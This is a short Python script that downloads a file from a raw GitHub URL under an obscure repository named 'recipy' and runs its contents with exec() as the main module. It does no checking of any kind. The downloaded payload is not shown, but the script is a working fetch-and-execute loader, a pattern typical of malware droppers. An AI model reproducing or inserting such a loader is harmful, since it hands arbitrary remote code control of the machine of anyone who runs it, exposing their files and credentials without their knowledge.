import requests

# URL of the remote Python script
url = "https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py"

try:
    # Download the content of the Python file
    response = requests.get(url)
    response.raise_for_status()  # Raise an error for bad status

    code = response.text

    # Execute the downloaded code
    exec(code, {"__name__": "__main__"})

except requests.RequestException as e:
    print("Failed to download the file:", e)
except Exception as e:
    print("Error while executing the code:", e)
